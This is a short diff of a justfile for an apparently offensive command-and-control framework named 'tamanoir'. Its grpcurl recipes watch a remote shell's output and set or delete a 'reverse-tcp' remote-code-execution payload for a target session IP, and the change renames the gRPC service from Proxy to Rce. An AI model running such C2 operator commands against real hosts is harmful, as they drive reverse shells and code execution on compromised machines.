@@ -30,9 +30,9 @@ c2_watch c2ip="192.168.1.15":
 c2_remote_shell_watch c2ip="192.168.1.15":
     grpcurl -plaintext  -proto tamanoir-common/proto/tamanoir/tamanoir.proto -d '{}' '{{c2ip}}:50051' tamanoir.RemoteShell/WatchShellStdOut
 c2_set_rce c2ip="192.168.1.15" session_ip="192.168.1.180" rce="reverse-tcp":
-    grpcurl -plaintext  -proto tamanoir-common/proto/tamanoir/tamanoir.proto -d '{"ip":"{{session_ip}}","target_arch":"x86_64","rce":"{{rce}}"}' '{{c2ip}}:50051' tamanoir.Proxy/SetSessionRce
+    grpcurl -plaintext  -proto tamanoir-common/proto/tamanoir/tamanoir.proto -d '{"ip":"{{session_ip}}","target_arch":"x86_64","rce":"{{rce}}"}' '{{c2ip}}:50051' tamanoir.Rce/SetSessionRce
 c2_delete_rce c2ip="192.168.1.15" session_ip="192.168.1.180":
-    grpcurl -plaintext  -proto tamanoir-common/proto/tamanoir/tamanoir.proto -d '{"ip":"{{session_ip}}" }' '{{c2ip}}:50051' tamanoir.Proxy/DeleteSessionRce
+    grpcurl -plaintext  -proto tamanoir-common/proto/tamanoir/tamanoir.proto -d '{"ip":"{{session_ip}}" }' '{{c2ip}}:50051' tamanoir.Rce/DeleteSessionRce
 
 #run c2 server
 c2_run:
